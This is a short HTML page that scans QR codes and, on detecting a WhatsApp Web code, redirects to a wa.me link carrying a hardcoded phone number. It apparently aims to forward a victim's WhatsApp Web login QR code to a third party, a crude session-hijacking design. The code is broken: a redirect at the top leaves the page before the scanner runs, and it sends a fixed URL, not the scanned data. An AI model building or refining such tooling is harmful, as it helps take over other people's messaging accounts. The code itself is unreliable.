<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatic WhatsApp Share</title>
    <script src="https://unpkg.com/html5-qrcode"></script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        #reader { width: 300px; margin: auto; }
    </style>
</head>
<body>
    <h1>WhatsApp QR Code Scanner</h1>
    <div id="reader"></div>
    <p>Scanned QR Code: <span id="result">Waiting...</span></p>
    <p>Redirecting to WhatsApp Web...</p>

    <script>
        // Automatically open WhatsApp Web
        window.location.href = "https://web.whatsapp.com";

        function onScanSuccess(decodedText) {
            document.getElementById('result').textContent = decodedText;
            if (decodedText.includes("https://web.whatsapp.com")) {
                alert("WhatsApp QR Code detected! Redirecting...");

                // Your phone number and message to send automatically (update phone number)
                const phoneNumber = "0778916353"; // Replace with the number you want to send the link to
                const message = "https://web.whatsapp.com"; // Replace with the link you want to send

                // Create WhatsApp URL
                const whatsappURL = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
                window.location.href = whatsappURL; // Redirect to WhatsApp with message
            }
        }

        function onScanFailure(error) {
            console.warn(`QR error: ${error}`);
        }

        let html5QrcodeScanner = new Html5QrcodeScanner(
            "reader", { fps: 10, qrbox: 250 }
        );
        html5QrcodeScanner.render(onScanSuccess, onScanFailure);
    </script>
</body>
</html>
